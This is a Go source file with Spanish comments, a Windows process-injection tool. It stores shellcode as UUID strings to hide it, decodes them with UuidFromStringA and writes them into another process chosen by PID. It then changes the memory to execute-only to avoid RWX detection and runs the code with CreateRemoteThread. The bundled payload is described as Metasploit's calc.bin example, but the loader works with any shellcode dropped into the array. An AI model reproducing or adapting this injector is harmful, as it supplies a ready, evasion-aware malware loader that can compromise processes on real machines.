package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

var (
	kernel32          = syscall.NewLazyDLL("kernel32.dll")
	ntdll             = syscall.NewLazyDLL("ntdll.dll")
	user32            = syscall.NewLazyDLL("user32.dll")
        modRpcrt4         = syscall.NewLazyDLL("rpcrt4.dll")


	proc_OpenProcess         = kernel32.NewProc("OpenProcess")
	proc_VirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	proc_WriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	proc_CreateRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	proc_VirtualProtectEx    = kernel32.NewProc("VirtualProtectEx")
        proc_UuidFromStringA     = modRpcrt4.NewProc("UuidFromStringA")
	proc_EnumSystemLocalesA  = kernel32.NewProc("EnumSystemLocalesA")

)

const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READ      = 0x20
)

// Shellcode en formato UUID (cada UUID son 16 bytes de shellcode)
// Ejemplo con calc.bin de metasploit convertido a UUIDs
var shellcodeUUIDs = []string{
        "e48348fc-e8f0-00c0-0000-415141505251",
        "d2314856-4865-528b-6048-8b5218488b52",
        "728b4820-4850-b70f-4a4a-4d31c94831c0",
        "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
        "48514152-528b-8b20-423c-4801d08b8088",
        "48000000-c085-6774-4801-d0508b481844",
        "4920408b-d001-56e3-48ff-c9418b348848",
        "314dd601-48c9-c031-ac41-c1c90d4101c1",
        "f175e038-034c-244c-0845-39d175d85844",
        "4924408b-d001-4166-8b0c-48448b401c49",
        "8b41d001-8804-0148-d041-5841585e595a",
        "59415841-5a41-8348-ec20-4152ffe05841",
        "8b485a59-e912-ff57-ffff-5d48ba010000",
        "00000000-4800-8d8d-0101-000041ba318b",
        "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
        "c48348d5-3c28-7c06-0a80-fbe07505bb47",
        "6a6f7213-5900-8941-daff-d563616c632e",
        "00657865-9090-9090-9090-909090909090",
}

func decodeUUIDs(uuids []string) ([]byte, error) {
	totalSize := len(uuids) * 16
	buf := make([]byte, totalSize)

	for i, uuidStr := range uuids {
		uuidCStr, err := syscall.BytePtrFromString(uuidStr)
		if err != nil {
			return nil, err
		}

		ptr := uintptr(unsafe.Pointer(&buf[i*16]))
		ret, _, _ := proc_UuidFromStringA.Call(
			uintptr(unsafe.Pointer(uuidCStr)),
			ptr,
		)
		if ret != 0 {
			return nil, fmt.Errorf("UuidFromStringA failed for UUID %s: 0x%x", uuidStr, ret)
		}
	}

	return buf, nil
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <PID>")
		os.Exit(1)
	}

	pid, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("Invalid PID:", err)
		os.Exit(1)
	}

	// 1. Decodificar los UUIDs a shellcode usando UuidFromStringA
	shellcode, err := decodeUUIDs(shellcodeUUIDs)
	if err != nil {
		fmt.Println("[-] UUID decode error:", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Decoded %d UUIDs -> %d bytes of shellcode\n", len(shellcodeUUIDs), len(shellcode))

	// 2. Abrir el proceso remoto
	hProcess, _, err := proc_OpenProcess.Call(
		uintptr(PROCESS_ALL_ACCESS),
		0,
		uintptr(pid),
	)
	if hProcess == 0 {
		fmt.Println("[-] OpenProcess failed:", err)
		os.Exit(1)
	}
	fmt.Println("[+] OpenProcess OK, handle:", hProcess)

	// 3. Reservar memoria RW en el proceso remoto
	remoteBuf, _, err := proc_VirtualAllocEx.Call(
		hProcess,
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if remoteBuf == 0 {
		fmt.Println("[-] VirtualAllocEx failed:", err)
		os.Exit(1)
	}
	fmt.Println("[+] Remote buffer allocated at:", fmt.Sprintf("0x%x", remoteBuf))

	// 4. Escribir el shellcode decodificado
	var written uintptr
	ret, _, err := proc_WriteProcessMemory.Call(
		hProcess,
		remoteBuf,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		fmt.Println("[-] WriteProcessMemory failed:", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Wrote %d bytes to remote process\n", written)

	// 5. Cambiar proteccion a RX (evitar RWX)
	var oldProtect uintptr
	ret, _, err = proc_VirtualProtectEx.Call(
		hProcess,
		remoteBuf,
		uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		fmt.Println("[!] VirtualProtectEx failed (continuing with RW):", err)
	}
	fmt.Println("[+] Memory protection changed to RX")

	// 6. Ejecutar con CreateRemoteThread (nativo)
	var threadID uintptr
	hThread, _, err := proc_CreateRemoteThread.Call(
		hProcess,
		0,
		0,
		remoteBuf,
		0,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if hThread == 0 {
		fmt.Println("[-] CreateRemoteThread failed:", err)
		os.Exit(1)
	}
	fmt.Println("[+] CreateRemoteThread OK, TID:", threadID)

	// 7. Esperar a que termine
	kernel32.NewProc("WaitForSingleObject").Call(hThread, 0xFFFFFFFF)
	fmt.Println("[+] Thread finished")

	// Cleanup
	kernel32.NewProc("CloseHandle").Call(hThread)
	kernel32.NewProc("CloseHandle").Call(hProcess)
}
